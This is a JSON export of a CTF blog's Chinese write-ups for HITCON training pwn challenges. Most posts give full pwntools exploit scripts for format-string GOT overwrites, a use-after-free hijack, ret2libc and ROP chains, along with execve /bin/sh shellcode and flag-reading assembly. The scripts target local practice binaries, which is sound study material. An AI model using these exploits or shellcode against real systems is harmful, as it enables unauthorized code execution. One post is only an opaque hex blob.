[{"title":"HITCONING training 6-10 writeup","date":"2020-01-07T02:57:55.000Z","path":"2020/01/07/HITCONING-training-6-10-writeup/","text":"migrationemmm, 这题的做法跟前面的一道题差不多， 都可以泄露libc地址，进行栈迁移， 然后执行system函数来getshell， 差不多的思路就不重复写了 crack除了pie和改写重定位表以外的保护都开了 程序逻辑为从urandom文件中读取4个字节作为password， 由于urandom这个文件的内容是随机的， 所以password不可控， 但是后面有个格式化字符串漏洞，并且参数在栈上， 那么可以利用”%10$s” 泄露出password， 之后就可以cat flag了 1234567891011121314151617181920212223242526272829303132333435363738391 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./crack\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./crack\")2627 payload = p32(elf.symbols['password']) + \"%10$s\"28 p.sendlineafter(\"What your name ? \", payload)2930 p.recv(11)31 leak = u32(p.recv(4))32 log.info(\"leak -&gt; \" + hex(leak))3334 p.sendlineafter(\"Your password :\", str(leak))3536 p.interactive()3738 if __name__ == '__main__':39 pwn() cat flag: craxme开了NX和CANARY 又是一个格式化控制字符串漏洞的题目， 不过这次不是要我们泄露数据， 而是向内存中写入数据一个为218一个为0xfaceb00c(-87117812)第一个好解决， 第二个需要分段写入， %hn往内存中写入两个字节 12345678910111213141516171819202122232425262728293031323334351 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./craxme\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./craxme\")2627 #payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$n\".format(218 - 4) flag28 payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$hn&gt;&gt;&gt;&gt;\".format((0xfaceb00c &amp; 0xffff)-4)29 payload += p32(elf.symbols['magic']+2) + \"%&#123;&#125;c%12$hn\".format((0xfaceb00c &gt;&gt; 16) - 0xb00c - 4 - 4)30 p.sendlineafter(\"Give me magic :\", payload)3132 p.interactive()3334 if __name__ == '__main__':35 pwn() cat flag: playfmt= = 格式化字符串漏洞三连… 只开了NX 这题printf的参数不在栈上在bss段， 但是可以无限次利用这个漏洞， 所以思路还是有得， 不过比较麻烦， 覆写got表需要在一次printf调用中完成，这就使得需要很多准备工作 1.利用 序号1 处得两个方框内栈的地址之间的指向关系， 将地址0xff849628 的内容改成strncmp 的got表地址2.再利用 序号2 处的方框内的的栈的地址之间的指向关系， 将地址0xff8496e4 的内容改成strncmp的got表地址+23.之后就是向strncmp_got内写入system的低两个字节， strncmp_got+2内写入system的高两个字节， 这样就可以成功覆盖strncmp的got表内容为system4.最后就是输入buf为/bin/sh 就可以getshell了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485861 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./playfmt\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./playfmt\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 str_got = elf.got['strncmp']2930 p.recvline()31 p.recvline()32 p.recvline()3334 p.sendline(\"%10$p\")35 leak = int(p.recvline()[:-1], 16)3637 payload = \"%&#123;&#125;c%10$hn\\0\".format(str_got &amp; 0xffff)38 p.send(payload.ljust(0xc8, '\\x00'))3940 payload = \"%&#123;&#125;c%6$hn&gt;&gt;\\0\".format((leak &amp; 0xffff) + 2)41 p.send(payload.ljust(0xc8, '\\x00'))4243 payload = \"%&#123;&#125;c%10$hn\".format(str_got &gt;&gt; 16)44 p.send(payload.ljust(0xc8, '\\x00'))4546 payload = \"%8$p\"47 p.send(payload.ljust(0xc8, '\\x00'))4849 p.recvuntil(\"@&gt;&gt;\")50 p.recvuntil(\"@\")51 leak_libc = int(p.recv(10), 16)52 log.info(\"leak_libc -&gt; \" + hex(leak_libc))5354 libc_base = leak_libc - libc.symbols['_IO_2_1_stdout_']55 log.info(\"libc_base -&gt; \" + hex(libc_base))56 system = libc_base + libc.symbols['system']5758 payload = \"&gt;&gt;&gt;%21$p\"59 p.send(payload.ljust(0xc8, '\\x00'))6061 p.recvuntil(\"&gt;&gt;&gt;\")62 leak_stack = int(p.recv(10), 16)63 log.info(\"leak_stack -&gt; \" + hex(leak_stack))64 # strncmp_got + 265 #0xe4 -&gt; 5766 payload = \"%&#123;&#125;c%22$hn\".format((leak_stack &amp; 0xffff) + 2)67 p.send(payload.ljust(0xc8, '\\x00'))6869 payload = \"%&#123;&#125;c%21$hn\".format((str_got &amp; 0xffff) + 2)70 p.send(payload.ljust(0xc8, '\\x00'))7172 payload = \"%&#123;&#125;c%59$hn\".format(str_got &gt;&gt; 16)73 p.send(payload.ljust(0xc8, '\\x00'))7475 payload = \"%&#123;&#125;c%14$hn\".format(system &amp; 0xffff)76 payload += \"%&#123;&#125;c%57$hn\".format((system &gt;&gt; 16) - (system &amp; 0xffff))77 p.send(payload.ljust(0xc8, '\\x00'))7879 payload = '/bin/sh\\0'80 p.send(payload.ljust(0xc8, '\\x00'))8182 p.interactive()8384 if __name__ == '__main__':85 pwn() getshell hacknote开了NX和CANARY 是个堆类型的题目， 在del_note中存在UAF漏洞， 限制的chunk的个数最多为5， 第一时间想到两种利用方式， 1.控制程序中的print_note函数中的函数指针2.进行常规的fastbin attack， 不过限制了chunk的大小， 而且感觉第一种更方便， 所以就用第一种了 利用思路：在print_note中调用的函数指针， 只要控制了函数指针指向system函数就可以达到getshell的目的， 具体步骤 1.创建一个大小大于fastbin大小的chunk， 随后free掉， 在分配一个大小不大于这个chunk的chunk， 随后利用print_note函数泄露libc地址2.这个程序的chunk结构chunk 的 data区data -&gt; &amp;print_note_contentdata+4 -&gt; 输入的数据data+… -&gt; 输入的数据或0 由于箭头指向的malloc是程序中分配的，不可控， 所以需要利用UAF漏洞重用这段chunk来让data -&gt; system 3.释放两个chunk， 在malloc(8)输入数据为p32(system) + “||sh\\0” 即可达成目的 由于题目也准备好了后门， 直接让data-&gt; &amp;magic也行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162631 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./hacknote\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 def add(size, content):26 p.sendlineafter(\"Your choice :\", str(1))27 p.sendlineafter(\"Note size :\", str(size))28 p.sendafter(\"Content :\", content)2930 def free(index):31 p.sendlineafter(\"Your choice :\", str(2))32 p.sendafter(\"Index :\", str(index))3334 def printf(index):35 p.sendafter(\"Your choice :\", str(3))36 p.sendafter(\"Index :\", str(index))3738 add(0x100, 'a') #039 add(0x20, 'b') #140 add(0x20, 'c') #241 free(0)42 add(0x100, '&gt;&gt;&gt;&gt;') #3 -&gt; 043 printf(3)4445 p.recvuntil(\"&gt;&gt;&gt;&gt;\")46 leak = u32(p.recvline()[:-1])47 libc_base = leak - (0xf7f5f7b0 - 0xf7dad000)48 log.info(\"leak -&gt; \" + hex(libc_base))4950 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")51 system = libc_base + libc.symbols['system']5253 free(1)54 free(2)55 raw_input()56 add(8, p32(system) + \"||sh\\0\") #457 printf(1)585960 p.interactive()6162 if __name__ == '__main__':63 pwn() getshell","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"HITCON training 1-5 writeup ","date":"2020-01-05T08:29:00.000Z","path":"2020/01/05/HITCON-training-writeup/","text":"由于期末考的原因， 好久没写题了， 做hitcon training 的题目来熟悉熟悉 sysmagic查看保护可以看到程序没开pie与got， plt 表之类的可以改写 程序逻辑比较简单不啰嗦了， 经过观察buf的值不可控但是flag比较明显是for循环内输出的东西， 而putchar 内的数据代码中都有， 所以第一想法是写个C语言脚本直接输出 1234567891011121314151617 1 #include &lt;stdio.h&gt; 2 #include &lt;string.h&gt; 3 #include &lt;stdlib.h&gt; 4 5 int main(int argc, char **argv)&#123; 6 int d[] = &#123;2036297540, 1801418095, 1601662830, 1601792119, 1952414061, 7 1835884901, 1600484449, 1851880015, 1767859559, 8 1869832051, 1735287135, 1061124466, 63&#125;; 9 char s[] = &#123;7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89,10 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0,11 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91,12 49, 85, 2, 30, 33, 16, 76, 30, 66&#125;;13 for(int i = 0;i &lt;= 0x30;++i)&#123;14 putchar(*((char*)d + i) ^ s[i]);15 &#125;16 return 0;17 &#125; flag: 看到flag的瞬间毫无防备的留下了弱者的泪水， 能动态调试为什么要费时间写脚本呢… orw查看保护除了栈溢出保护其它保护全关了 程序逻辑简单， 要求输入shellcode来执行指令， 不过程序用了沙箱禁用了exceve系统调用， 不过没有禁用read, write, open等系统调用， 所以可以通过执行这三个系统调用直接把flag读出来关于沙箱这篇文章讲的比较详细：seccomp学习笔记通过执行seccomp-tools dump ./orw 可以查看可以执行哪些系统调用系统调用号查询:linux 系统调用号表 汇编代码(我用的是ATT格式)： 12345678910111213141516171819202122232425262728291 .section .text2 .globl _start3 4 _start:5 xor %eax, %eax6 movl $0x804A09b, %ebx7 movl $4, %ecx8 xor %edx, %edx9 movb $5, %al10 int $0x8011 12 movl %eax, %ebx13 pushl %esp14 movl %esp, %ecx15 movl $0x30, %edx16 xor %eax, %eax17 movb $3, %al18 int $0x8019 20 movl $1, %ebx21 pushl %esp22 popl %ecx23 movl $0x30, %edx24 xor %eax, %eax25 movb $4, %al26 int $0x8027 28 movl $1, %eax29 int $0x80 成功读取flag(由于没有靶机， 所以我在本地创建了一个flag文件) ret2sc保护全关 看到程序逻辑就是栈迁移执行shellcode具体步骤为将shellcode植入到bss段， 之后再将栈迁移到bss段中，然后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435361 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./ret2sc\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2sc\")2627 shellcode = p32(elf.symbols['name'] + 4) + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"28 p.sendlineafter(\"Name:\", shellcode)2930 payload = 'a'*(0x14+8) + p32(elf.symbols['name'] - 4) + p32(0x804853c)31 p.sendlineafter(\"Try your best:\", payload)3233 p.interactive()3435 if __name__ == '__main__':36 pwn() 成功getshell ret2lib除了栈上数据不可执行以外的保护全关了 程序逻辑分析：程序中可以指定一个地址并且输出这个地址的内容， 随后的print_message函数中很明显存在栈溢出 那么思路就比较明了了， 先泄露libc地址， 随后计算出libc基址，之后利用栈溢出执行system， 最后getshell由于泄露地址后可以直接利用LibcSearcher 搜索出libc版本， 为了方便我直接用本机的libc版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445461 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./ret2lib\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2lib\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 p.sendlineafter(\"Give me an address (in dec) :\", str(elf.got['puts']))29 leak = hex(int(p.recvline()[-9:-1], 16))30 log.info(\"leak -&gt; \" + leak)3132 libc_base = int(leak, 16) - libc.symbols['puts']33 log.info(\"libc_base -&gt; \" + hex(libc_base))3435 system = libc_base + libc.symbols['system']36 binsh = libc_base + libc.search('/bin/sh\\0').next()3738 pppr = 0x080486CD39 payload = 'a'*(0x38 + 4) + p32(system) + p32(0x12345678) + p32(binsh)4041 p.sendlineafter(\"Leave some message for me :\", payload)4243 p.interactive()4445 if __name__ == '__main__':46 pwn() 成功getshell simplerop除了NX其它全关 观察程序逻辑只有一个栈溢出， 而这个文件是个静态链接的文件，尝试找system的地址， 但是查找符号表没找到system但是open, write, read的地址都可以找到， 这意味着跟前面的题目思路一样， 利用rop调用这三个函数来读取flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546471 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./simplerop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./simplerop\")2627 pppr = 0x080491D22829 payload = 'a'*(0x1c + 4) + p32(elf.symbols['read']) + p32(pppr)30 payload += p32(0) + p32(elf.bss() + 0x200) + p32(0x10) + p32(elf.symbols['main'])3132 p.sendafter(\"Your input :\", payload.ljust(100, '\\x00'))3334 p.sendline(\"flag\\0\")3536 raw_input()37 payload = 'a'*0x1838 payload += p32(elf.symbols['open']) + p32(pppr) + p32(elf.bss() + 0x200) + p32(4) + p32(0)39 payload += p32(elf.symbols['read']) + p32(pppr) + p32(3) + p32(elf.bss() + 0x200) + p32(0x10)40 payload += p32(elf.symbols['write']) + p32(pppr) + p32(1) + p32(elf.bss() + 0x200) + p32(0x10)4142 p.sendlineafter(\"Your input :\", payload)4344 p.interactive()4546 if __name__ == '__main__':47 pwn() 结果:","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"Hello World","date":"2019-12-19T13:45:35.530Z","path":"2019/12/19/hello-world/","text":"给爷密码 56d7b3367aa49e28656be8eed6581cbf75773aa16885176585bd5c2aad635ab9a22eb547c4d3a84eb38fdea1c040c23b2bd9f11cb65f50934b013996abd7b75716c338903d9862d4286309cb051bfb57035f061536a3d42ca48bc465649efab864f819864036558d6e797601918ccb9f96b1829f09798ac45becaaf4e2b0ca5898af54256f667defda0fa8b22da5196d04cf0647a291a24d7f4c429ad660197655be4c1f958ea05893b3c469246c179a4c29d92a2e9ba7aabb0b57ac28654afd49f27960b5bc50ed45af917ef1a21108bb49d21a675a664b95aa28af6115fd796696601383b2abe66d0e1730cb1a09401c47271860caeac2446659d3b7f20dcd518fbf53dd93e8bfbe2e4b1048924d1b8025bc746d1caeef69ea1367edcd1e605b4149883a574c0d26ac78e730e065e4b0d42ff59f3bfba5dcf01f1147261d6e14852fdd375d2422f7a05dadd656294b829801a266f33eb69e510ec8d8570efe54735ab251d83f48e04fb4b6178551cc5737488c86ca6d2085b2c7a76b2d85ec15c57a095de581e4ca024da66842b4e6ea5fa0cddffb2aff24aeee17bed501b247150c78678829afee80f321e1c8fc9925e4d910fe2ab33c492bbb13a3affdb2101c4e322c74c410a4e46e3ca1acd1b6faf50c67edf4cd0310640bc27b4c597a38f9aec7a7c8f02c8213af4c70af61d9316efe432a70c549c2ce7f245e16bf0325ebc3fc5e6607d6cc7785d1ee8fc6aa8f1501b2f09ec7847c8a0cbe0c7e09ba87781e9b0ef775e1eee62432b88b9ecb6692ba98052ae2d6699cbc1e9dec39342ebae94af11896e8ff1292e86cbe3c084326392ddc857e568303f3dc59cd3fc55cdd9a734d7c45dba3fa912bad5ab97ea1f1e99626d853d038c1b13e19e642f3711813123987e27b995e0079bc1064553d88f58781394c4d1b36adc2530f4bbc6ec819bdf40646393a5f12d9787c4c16e705fa62f200eb3840abbe2e30def0fb7f3c5e5d8fe663ca54c5d4971f5fbb1792e7554d1d66d974d0b5fa1fba9f06704a80bf34c30abaa8bb2cad5e174576e593fe6db178d0286c79e740fdc686677d4d0b35f38fa78f1384716242a841675f0096c72956a298033691b120f0745a6b6dfde05b1c8b047a08ae8cb08c4879fd1fadfaa46fb80dd0096b4cadd6e15ef6fd3f774536ae41522e388c90ad0efd854b562bcfde197b21c24ef099e5c37603082d51bae71b081cce311be24e218a819ce1074cac40acc895f9782cd1a98094fba0c26d2cd0af5a9a10b91f69d5888063040a8b5590367ce56c0efffc3d747b89542f58a0cde4343ee8a4df5b22e882c534fdbc1c3c82beb9c48e7d133402253837c3cb5aa32d00f46901358a7c60142ee2c6169ca29122d64ba3b302f31bef40b333d08500e2073e10035baa0a4ef6413299b29c2483889cdc5ca81ab838c2f0a8cf8a99fa465ed39e5496b56fabceb5ebb33a661ed4370d3a238ad94dd399b7bcd07716e64f85a37176633de2a02b380ef677a5b617e21afadecc8752700a97ab9c41300d604b735685c7aac360a8ba8fd11c35a613359ea393be8a317555c51346ea2af4590b91f9f50d340ee1ce9d8f0d9b759efefbef8232955442f99623ccd4c2706cef624202cb95f4f893314d224a8a57f6467456321f209061abe216beecfc6bbbb75a03838e37b782a1940e3c16b11348cee3d975b4489cb804e47ab47bc165aece09a539f5f25255f439eea0bc88313ae165f82e9a53981112521e61cdca1858207a8753d3df47f112995bf88320148dc769a191602f43ec3e798900ff178664ed36594d5ac18abeb76e5aa82b5e24caacf3b7846548faffcbf1be70c94dc8c8060c0df0e9bdce003dd48df77399e3306db8f3ba8823247eb3747f9d70e98259cd8e4b931b1cc5dc0c45eb622af16c38e1a5268758719daabce7443ffcc92d124568e4eea7423691c11e10c56a39d466ab407177ac62f8c5468dba6182e248c4e028249d7cc7912b189da38e4fe7729d24571b1c826e94347288a6fd27724007e630a698fb4e8c27b5db5da628f1779c67c9392fbe6fb340e551cefcfe13d2b442e029b9190964c284b33a052fdce924d9ac15bd014bc001568cc56ab10585970da4131e7cee0c75985d83c953eb2ca3517ff320456243157792c9c06c8f407c063a0b69e6930f9d97538c9eae462f0aa105b1454536369daff06e2e3713b49db54251a8853c605df7af953f7f23bda83963ea1bce23cbb5a0984d6cb4df5c1dc15cbbf51c6411e03cec5a30496638b20ece7672c6fd749025484c499b1b714039c0d64e03482003787befb2e9607474195968f98d47e603e5a02da6b9184b2d32a5b80f49cb9f8d9fe4f56f82417275ace826d505fc776f3199e995eb368ade9d12ca8785a419321447e4c7d745fbfc2c0ee3ce5ecadd9f4cc835d97d59bb9f6747aaf5c67489f9793733a0e0cd4b109312d876b425d919d8acef55a9048ac509563130550674f00843c15dc7e1f0419f12f152d47a7e204a990247ff1038068754ffc543ee6ae60fe220466b45dd639165bb068eef5159eb9680a37f87a78045329f16b756e80c8805621560fb0d05fa960e9aaeeb61c8521671c712e3769c5ec0a0143a7c8c2981306c4de084166969dd2a4ecd55a198b75353730a9f1396573e9b739500a7b24842058ab333160ffb74932e613e61279e3cb4725fbc0f6b675fea5da3d8544b0032a952f6a5ec69fe957c7e28e59f0d9d3129ee46627e9c23bd6004e99469f48840d3197ff3483b2d30d10391f717bffcc9fc92b55ba828e28611dc26d2146aa488249c907c0ebd32841d21fd3173d38aca2751f35cbf6b727fa7a9087153230b3904d665c5e46de3a67a5053ef0d458f641e1216fec0f66827cf4395c86532aac9d1957cf094008abf54dfdd23cb0e1c38ee385142046170b62dbd93395a20f146ab7609bf9158a043ce563fe34d153b39f96e2db1380483ae44f6d7525aaa424b95076c9e2b35578f66022f872185b934433aeaf8b386c4423166668f3fc85cc32fc41c6e92ce2f3495ea3927534824565ab28e3cea14a851f0a01875a1fa5485927cbf7e82e64a19f95a3ae8179848243b211feb7e361913213ecb83d6e19a33ade5f7e67c2c2b0040f50e8a6a00c0c8554937c979d9f9c3af1638a760eff57294921d45c89f8569253599fbd539c0808afad574edecde967184f6be079f3281678f8fc028d7d8422eee0c08f3ab5896dbad660ad41c19552b46351ac44fd178b9707ef77d85b610340f6b65869c1b74530c1fe26e31bdcc89545a1b32b486f2322e5850025688e916063e87a4289030ee610e7da8a13800860b8c4727f3b8ff35b39597308857d3619178c1f47c1046e646144746c8e47086d101e1d2f4307c0900b1c4b0aeabc720625f2245b94acf5ed8a09156418a1d5a30160c95d649a5","tags":[]}]